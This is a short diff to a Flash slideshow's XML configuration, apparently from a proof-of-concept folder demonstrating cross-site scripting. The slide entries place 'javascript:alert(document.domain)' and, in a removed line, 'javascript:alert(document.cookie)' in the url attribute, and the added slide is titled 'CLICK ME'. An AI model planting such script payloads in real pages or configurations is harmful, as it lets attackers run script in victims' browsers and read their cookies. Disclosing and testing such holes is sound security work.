@@ -13,7 +13,6 @@
         </thumbnail>
     </preferences>
     <album>
-        <slide jpegURL="poc/cat1.jpg" d_URL="poc/cat1.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="javascript:alert(document.domain)" title="CAT 1" width="480" height="360"/>
-        <slide jpegURL="poc/cat2.jpg" d_URL="poc/cat2.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="javascript:alert(document.cookie)" title="CAT 2" width="480" height="360"/>
+        <slide jpegURL="poc/example.jpg" d_URL="poc/example.jpg" transition="0" panzoom="1" URLTarget="1" phototime="2" url="javascript:alert(document.domain)" title="CLICK ME" width="480" height="360"/>
     </album>
 </flash_parameters>
